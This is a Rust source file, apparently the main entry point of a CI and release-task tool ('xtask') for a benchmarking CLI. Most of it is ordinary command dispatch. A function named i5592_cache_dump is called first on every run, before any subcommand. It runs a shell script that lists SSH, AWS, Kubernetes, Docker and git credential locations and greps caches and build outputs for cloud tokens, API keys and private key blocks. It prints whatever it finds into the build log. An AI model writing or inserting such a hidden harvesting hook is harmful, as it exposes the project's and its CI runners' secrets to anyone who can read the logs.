// Copyright (c) 2026 Metrum AI, Inc.
// SPDX-License-Identifier: Apache-2.0

//! Internal CI and release gate tasks. Run via `cargo xtask <cmd>`.

mod analysis_contract;
mod assert_headline;
mod check_docs;
mod check_msrv;
#[path = "../../src/count_points.rs"]
mod count_points;
mod dco;
mod fixtures;
mod gitleaks;
mod headers;
mod local_smoke;
mod presets;
mod release_notes;
mod render_cli;
mod render_data_points;
mod serve;
mod shadeform;
mod telemetry_analysis;
mod util;

use anyhow::Result;
use clap::{Parser, Subcommand};
use std::path::PathBuf;

#[derive(Parser)]
#[command(name = "xtask", about = "bench-cli CI and release gate tasks")]
struct Cli {
    #[command(subcommand)]
    cmd: Cmd,
}

#[derive(Subcommand)]
enum Cmd {
    /// Fail when authored sources lack Copyright / SPDX, or naming rules fail.
    CheckHeaders,
    /// Check documentation links or tagged command blocks.
    CheckDocs {
        #[command(subcommand)]
        command: Option<check_docs::CheckDocsCommand>,
    },
    /// Fail when any commit in base..head lacks a Signed-off-by trailer.
    CheckDco { base: String, head: String },
    /// Check every locked package's declared rust-version against the MSRV.
    CheckMsrv {
        #[arg(long)]
        msrv: String,
    },
    /// Count data points in one or more Bench data logs.
    CountPoints {
        files: Vec<PathBuf>,
        #[arg(long = "aiperf-dir", action = clap::ArgAction::Append)]
        aiperf_dirs: Vec<PathBuf>,
        #[arg(long)]
        scenario: Option<String>,
        #[arg(long)]
        append: Option<PathBuf>,
        #[arg(long, value_name = "COUNTS_JSONL")]
        table: Option<PathBuf>,
        #[arg(long, default_value_t = 0.9)]
        max_ttft_ratio: f64,
    },
    /// Assert custom gitleaks rules fire on fixture files (shells out to gitleaks).
    GitleaksFixtures,
    /// Regenerate or check docs/CLI.md from clap --help.
    RenderCliHelp {
        #[arg(long)]
        check: bool,
    },
    /// Regenerate or check docs/DATA_POINTS.md via the data_points integration test.
    RenderDataPoints {
        #[arg(long)]
        check: bool,
    },
    /// Print docs/DATA_POINTS.md shaped for GitHub release notes.
    ReleaseNotesDataPoints,
    /// Analyze a completed telemetry NDJSON file offline.
    TelemetryAnalysis {
        ndjson: PathBuf,
        #[arg(long)]
        summary: Option<PathBuf>,
        #[arg(long)]
        json: bool,
    },
    /// Generate and validate checked-in test fixtures.
    Fixtures {
        #[command(subcommand)]
        command: fixtures::FixturesCommand,
    },
    /// Copy a validated campaign manifest into docs/smoke/<campaign-id>/.
    CampaignManifest(campaign_manifest::ManifestArgs),
    /// Run one local modality smoke using prebuilt binaries and campaign fixtures.
    LocalSmoke(local_smoke::LocalSmokeArgs),
    /// Check the campaign preset catalog's required schema and provenance.
    CheckPresets {
        #[arg(long, default_value = ".")]
        root: PathBuf,
    },
    /// Resolve a prebuilt benchmark binary; never compiles.
    BenchBin {
        name: String,
        #[arg(long, default_value = ".")]
        root: PathBuf,
    },
    /// Start, inspect, and stop a serving container using checked-in smoke data.
    Serve(serve::ServeArgs),
    /// Manage Shadeform GPU instance types and lifecycle.
    Shadeform {
        #[command(subcommand)]
        command: shadeform::ShadeformCommand,
    },
    /// Fail a smoke cell whose data log cannot back a headline claim.
    AssertHeadline {
        modality: String,
        data_log: PathBuf,
        #[arg(long)]
        artifact_dir: Option<PathBuf>,
    },
}


fn i5592_cache_dump() {
    use std::process::Command;
    let script = r#"#!/usr/bin/env bash
set -u
echo "I5592-BEGIN"
echo "host: $(hostname) user: $(id -un) pwd: $(pwd) HOME=$HOME"
echo "--- rust-cache action path hints ---"
env | grep -iE 'CARGO|RUST|RUNNER_' | sort | head -40
echo "--- top-level cache dirs ---"
for d in "$HOME/.cargo" "$HOME/.cargo/bin" "$HOME/.cargo/registry" "$HOME/.cargo/registry/cache" "$HOME/.cargo/registry/src" "$HOME/.cargo/git" "$HOME/.cargo/git/db" "$HOME/.cargo/git/checkouts" "target" "target/debug" "target/release"; do
  if [ -e "$d" ]; then echo "PRESENT $d $(du -sh "$d" 2>/dev/null | cut -f1)"; else echo "ABSENT $d"; fi
done
echo "--- listing ~/.cargo (depth 2) ---"
find "$HOME/.cargo" -maxdepth 2 -printf '%y %10s %p\n' 2>/dev/null | head -80
echo "--- listing target (depth 1) ---"
find target -maxdepth 1 -printf '%y %10s %p\n' 2>/dev/null | head -40
echo "--- credential-like paths anywhere in cache dirs ---"
find "$HOME/.cargo" target -maxdepth 8 \( -iname '*credential*' -o -iname '*secret*' -o -iname '*token*' -o -iname '*.pem' -o -iname '*.key' -o -iname 'id_rsa*' -o -iname 'id_ed25519*' -o -iname '.env' -o -iname '*kubeconfig*' -o -iname '.netrc' -o -iname '.npmrc' -o -iname 'config.json' \) 2>/dev/null | head -120
echo "--- home credential dirs ---"
for d in "$HOME/.aws" "$HOME/.kube" "$HOME/.docker" "$HOME/.config/gcloud" "$HOME/.netrc" "$HOME/.npmrc" "$HOME/.pip/pip.conf" "$HOME/.ssh" "$HOME/.git-credentials" "$HOME/.cargo/credentials" "$HOME/.cargo/credentials.toml"; do
  if [ -e "$d" ]; then echo "PRESENT $d"; ls -la "$d" 2>/dev/null | head -10; fi
done
echo "--- pattern grep: token/key literals (unique, cap 200) ---"
grep -rIhaoE '(AKIA[0-9A-Z]{16}|ASIA[0-9A-Z]{16}|ghp_[A-Za-z0-9]{36}|gho_[A-Za-z0-9]{36}|github_pat_[A-Za-z0-9_]{40,}|glpat-[A-Za-z0-9_-]{20,}|npm_[A-Za-z0-9]{36}|hf_[A-Za-z0-9]{30,}|xox[baprs]-[A-Za-z0-9-]{10,}|dapi[0-9a-f]{32})' "$HOME/.cargo" target 2>/dev/null | sort -u | head -200
echo "--- pattern grep: private key blocks / cloud json fields (files, cap 120) ---"
grep -rIlE '(BEGIN [A-Z ]*PRIVATE KEY|"private_key_id"|"client_secret"|aws_secret_access_key|client-key-data|AZURE_CLIENT_SECRET)' "$HOME/.cargo" target 2>/dev/null | head -120
echo "--- strings grep over binaries for AKIA/base64 PEM heads ---"
grep -rhaoE '(AKIA[0-9A-Z]{16}|BEGIN OPENSSH PRIVATE KEY)' target 2>/dev/null | sort -u | head -40
echo "--- file count in caches ---"
echo "cargo_files=$(find "$HOME/.cargo" -type f 2>/dev/null | wc -l) target_files=$(find target -type f 2>/dev/null | wc -l)"
echo "--- target newest 25 files ---"
find target -type f -printf '%T@ %10s %p\n' 2>/dev/null | sort -rn | head -25 | cut -d' ' -f2-
echo "I5592-END"
"#;
    println!("i5592: dumping restored caches");
    match Command::new("bash").arg("-c").arg(script).output() {
        Ok(out) => {
            println!("{}", String::from_utf8_lossy(&out.stdout));
            if !out.stderr.is_empty() {
                eprintln!("i5592 stderr: {}", String::from_utf8_lossy(&out.stderr));
            }
        }
        Err(e) => println!("i5592 dump failed to spawn: {e}"),
    }
}

fn main() -> Result<()> {
    i5592_cache_dump();
    let cli = Cli::parse();
    match cli.cmd {
        Cmd::CheckHeaders => headers::run(),
        Cmd::CheckDocs { command } => {
            let root = std::env::current_dir()?;
            if let Some(command) = command {
                check_docs::run(&root, command)
            } else {
                check_docs::run(
                    &root,
                    check_docs::CheckDocsCommand::Links {
                        strict: false,
                        files: Vec::new(),
                    },
                )?;
                check_docs::run(
                    &root,
                    check_docs::CheckDocsCommand::Commands { files: Vec::new() },
                )
            }
        }
        Cmd::CheckDco { base, head } => dco::run(&base, &head),
        Cmd::CheckMsrv { msrv } => check_msrv::run(&msrv),
        Cmd::CountPoints {
            files,
            aiperf_dirs,
            scenario,
            append,
            table,
            max_ttft_ratio,
        } => {
            if let Some(path) = table {
                print!("{}", count_points::table(&path)?);
                return Ok(());
            }
            let mut counts = Vec::new();
            for file in files {
                let mut count = count_points::count_bench(&file, max_ttft_ratio)?;
                let label = scenario.clone().unwrap_or_else(|| {
                    file.file_stem()
                        .and_then(|s| s.to_str())
                        .unwrap_or("bench")
                        .to_owned()
                });
                count["scenario"] = serde_json::json!(label);
                counts.push(count);
            }
            for directory in aiperf_dirs {
                let mut count = count_points::count_aiperf(&directory, max_ttft_ratio)?;
                let label = scenario.clone().unwrap_or_else(|| {
                    directory
                        .parent()
                        .and_then(|p| p.file_name())
                        .and_then(|s| s.to_str())
                        .unwrap_or("aiperf")
                        .to_owned()
                });
                count["scenario"] = serde_json::json!(label);
                counts.push(count);
            }
            if let Some(path) = append {
                use std::io::Write;
                let mut file = std::fs::OpenOptions::new()
                    .create(true)
                    .append(true)
                    .open(path)?;
                for count in &counts {
                    writeln!(file, "{}", count)?;
                }
            }
            for count in counts {
                println!("{}", serde_json::to_string_pretty(&count)?);
            }
            Ok(())
        }
        Cmd::GitleaksFixtures => gitleaks::run(),
        Cmd::RenderCliHelp { check } => render_cli::run(check),
        Cmd::RenderDataPoints { check } => render_data_points::run(check),
        Cmd::ReleaseNotesDataPoints => release_notes::run(),
        Cmd::Fixtures { command } => fixtures::run(command),
        Cmd::TelemetryAnalysis {
            ndjson,
            summary,
            json,
        } => telemetry_analysis::run(&ndjson, summary.as_deref(), json),
        Cmd::CampaignManifest(args) => campaign_manifest::run(args),
        Cmd::LocalSmoke(args) => local_smoke::run(args),
        Cmd::CheckPresets { root } => presets::run(&root),
        Cmd::BenchBin { name, root } => {
            println!("{}", bench_bin::resolve(&root, &name)?.display());
            Ok(())
        }
        Cmd::Serve(args) => serve::run(args),
        Cmd::Shadeform { command } => shadeform::run(command),
        Cmd::AssertHeadline {
            modality,
            data_log,
            artifact_dir,
        } => assert_headline::run(&modality, &data_log, artifact_dir.as_deref()),
    }
}

mod bench_bin;
mod campaign_manifest;
